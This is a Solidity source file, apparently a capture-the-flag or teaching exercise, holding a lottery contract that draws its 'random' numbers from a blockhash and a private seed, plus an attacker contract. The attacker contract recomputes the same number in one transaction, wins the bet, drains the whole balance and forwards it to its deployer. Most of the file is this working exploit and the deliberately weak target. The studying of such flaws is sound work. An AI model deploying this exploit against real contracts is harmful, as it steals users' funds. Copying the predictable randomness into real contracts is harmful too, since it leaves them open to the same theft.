// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.0;

import "hardhat/console.sol";

contract PrivateRyan {

    uint256 private seed = 1;

    constructor() {
        seed = rand(256);
 
    }

    function spin(uint256 bet) public payable {
       
        require(msg.value >= 0.01 ether);
    
        uint256 num = rand(100);
        seed = rand(256);
        if (num == bet) {        
            (bool succes, ) = payable(msg.sender).call{
                value: address(this).balance
            }("");
            require(succes, "Failed to send Ether");
        }
    }

    //Generate random number between 0 & max
    uint256 private constant FACTOR =
        1157920892373161954235709850086879078532699846656405640394575840079131296399;

    function rand(uint256 max) private view returns (uint256 result) {
        uint256 factor = (FACTOR * 100) / max;
        uint256 blockNumber = block.number - seed;
        uint256 hashVal = uint256(blockhash(blockNumber));

        return uint256((uint256(hashVal) / factor)) % max;
    }

    receive() external payable {}
}

//**********************************************************************************/
//**********************************************************************************/

contract atackPrivateRyan {
    PrivateRyan atack;

    address private atackAddres;

    uint256 private constant FACTOR =
        1157920892373161954235709850086879078532699846656405640394575840079131296399;

    function rand(uint256 _max, uint256 _seed) private view returns (uint256) {
      
        uint256 factor = (FACTOR * 100) / _max;
        uint256 blockNumber = block.number - _seed ;        

        uint256 hashVal = uint256(blockhash(blockNumber));      
        uint256 random = uint256((uint256(hashVal) / factor)) % _max;
        return random;
    }

    function functionAtack(uint256 _max, uint256 _seed) public payable {            
        
        uint256 randon = rand(_max, _seed);           
        atack.spin{value:msg.value}(randon);
        
    }

    receive() external payable {
        (bool succes, ) = payable(atackAddres).call{value: msg.value}("");
        require(succes);
    }

    constructor(address payable _atack) {
        atackAddres = msg.sender;
        atack = PrivateRyan(_atack);
    }
}
